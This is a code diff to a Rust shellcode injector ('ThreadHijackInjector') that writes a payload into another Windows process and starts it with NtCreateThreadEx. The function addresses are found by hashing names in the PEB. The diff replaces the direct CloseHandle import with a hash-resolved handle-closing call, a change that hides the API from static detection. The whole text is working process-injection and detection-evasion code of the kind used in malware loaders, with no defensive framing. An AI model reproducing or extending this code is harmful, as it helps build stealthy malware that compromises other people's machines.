@@ -18,7 +18,6 @@ impl Injector for ThreadHijackInjector {
     /// directly at the shellcode.  The target process's other threads are never
     /// touched, eliminating the return assumption entirely.
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
         use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
@@ -56,7 +55,7 @@ impl Injector for ThreadHijackInjector {
                 pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                     .unwrap_or(0);
             if ntdll_base == 0 {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("ThreadHijackInjector: ntdll not found in PEB"));
             }
             let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
@@ -66,7 +65,7 @@ impl Injector for ThreadHijackInjector {
             let ntcreate_addr = match ntcreate_addr {
                 Some(a) => a,
                 None => {
-                    CloseHandle(h_proc);
+                    pe_resolve::close_handle(h_proc);
                     return Err(anyhow!("ThreadHijackInjector: NtCreateThreadEx not found"));
                 }
             };
@@ -94,7 +93,7 @@ impl Injector for ThreadHijackInjector {
                 PAGE_READWRITE,
             );
             if remote_mem.is_null() {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("VirtualAllocEx failed"));
             }
 
@@ -107,7 +106,7 @@ impl Injector for ThreadHijackInjector {
                 &mut written,
             ) == 0
             {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("WriteProcessMemory failed"));
             }
 
@@ -137,12 +136,12 @@ impl Injector for ThreadHijackInjector {
                 std::ptr::null_mut(),
             );
             if status < 0 || h_thread.is_null() {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("NtCreateThreadEx failed: {:x}", status));
             }
 
-            CloseHandle(h_thread);
-            CloseHandle(h_proc);
+            pe_resolve::close_handle(h_thread);
+            pe_resolve::close_handle(h_proc);
         }
         Ok(())
     }
